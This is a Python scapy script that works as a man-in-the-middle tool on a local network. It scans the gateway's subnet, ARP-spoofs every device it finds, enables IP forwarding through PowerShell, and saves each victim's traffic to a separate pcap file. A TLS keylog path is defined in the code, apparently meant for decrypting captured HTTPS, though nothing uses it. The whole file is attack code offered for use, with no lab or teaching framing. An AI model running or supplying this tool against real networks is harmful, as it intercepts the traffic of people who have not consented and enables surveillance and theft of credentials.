import scapy.all as scapy
from scapy.utils import PcapWriter
import threading
import time
import os
import sys
import subprocess
import re

INTERFACE = scapy.conf.iface.name
BASE_OUTPUT_DIR = r'C:\Users\User\Downloads\Network_Project'
TLS_KEYLOG = r'C:\Users\User\sslkeylog.log'
MY_MAC = None
GATEWAY_IP = scapy.conf.route.route("0.0.0.0")[2]

tracked_devices = set()
device_writers = {}
stop_event = threading.Event()

def Aget_mac(ip):
    try:
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None

def Lenable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    try:
        cmd = "Set-NetIPInterface -Forwarding Enabled"
        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    except Exception as e:
        print(f"[!] Could not set IP forwarding: {e}")

def Mget_writer_for_device(ip_addr):
    if ip_addr not in device_writers:
        folder = os.path.join(BASE_OUTPUT_DIR, f"Device_{ip_addr}")
        os.makedirs(folder, exist_ok=True)
        
        pcap_path = os.path.join(folder, "capture.pcap")
        print(f"[+] Created data channel for: {ip_addr} -> {pcap_path}")
        
        device_writers[ip_addr] = {
            'writer': PcapWriter(pcap_path, append=True, sync=True),
            'path': pcap_path,
            'folder': folder
        }
    return device_writers[ip_addr]

def Opacket_handler(pkt):
    if scapy.IP not in pkt:
        return

    src_ip = pkt[scapy.IP].src
    dst_ip = pkt[scapy.IP].dst

    for target_ip in list(tracked_devices): 
            if src_ip == target_ip or dst_ip == target_ip:
                device_data = Mget_writer_for_device(target_ip)
                try:
                    device_data['writer'].write(pkt)
                except Exception:
                    pass

def Gstart_sniffer():
    print(f"[*] Sniffer started on {INTERFACE}...")
    scapy.sniff(
        iface=INTERFACE, 
        prn=Opacket_handler, 
        store=False, 
        stop_filter=lambda x: stop_event.is_set()
    )

def spoof_target(target_ip, gateway_ip):
    target_mac = Aget_mac(target_ip)
    gateway_mac = Aget_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print(f"[!] Could not find MAC for {target_ip} or Gateway.")
        return

    print(f"[+] Spoofing active: {target_ip} <--> {GATEWAY_IP}")
    
    packet_1 = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    packet_2 = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

    while not stop_event.is_set():
        scapy.sendp(packet_1, verbose=False)
        scapy.sendp(packet_2, verbose=False)
        time.sleep(2)

def restore_network(gateway_ip):
    print("\n[*] Restoring network...")
    gateway_mac = Aget_mac(gateway_ip)
    for target_ip in list(tracked_devices):
        target_mac = Aget_mac(target_ip)
        if target_mac and gateway_mac:
            res_pkt = scapy.Ether(dst=target_mac)/scapy.ARP(
                op=2, 
                pdst=target_ip, 
                psrc=gateway_ip, 
                hwdst=target_mac, 
                hwsrc=gateway_mac
            )
            scapy.sendp(res_pkt, count=4, verbose=False)
    print("[*] Network restored.")

def main_loop():
    global MY_MAC
    
    Lenable_ip_forwarding()
    MY_MAC = scapy.get_if_hwaddr(INTERFACE)
    print(f"[*] Interface MAC: {MY_MAC}")
    
    sniff_thread = threading.Thread(target=Gstart_sniffer, daemon=True)
    sniff_thread.start()

    print("[*] Scanning for new devices...")
    try:
        while True:
            ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=f"{GATEWAY_IP}/24"), timeout=2, verbose=False)
            
            for element in ans:
                ip = element[1].psrc
                
                if ip != GATEWAY_IP and ip != scapy.get_if_addr(INTERFACE):
                    
                    if ip not in tracked_devices:
                        print(f"[+] New Device Found: {ip}")
                        tracked_devices.add(ip)
                        
                        t = threading.Thread(target=spoof_target, args=(ip, GATEWAY_IP), daemon=True)
                        t.start()
            
            time.sleep(10)

    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        stop_event.set()
        restore_network(GATEWAY_IP)
        for ip, data in device_writers.items():
            data['writer'].close()
            print(f"[*] Saved capture for {ip}")

if __name__ == "__main__":
    main_loop()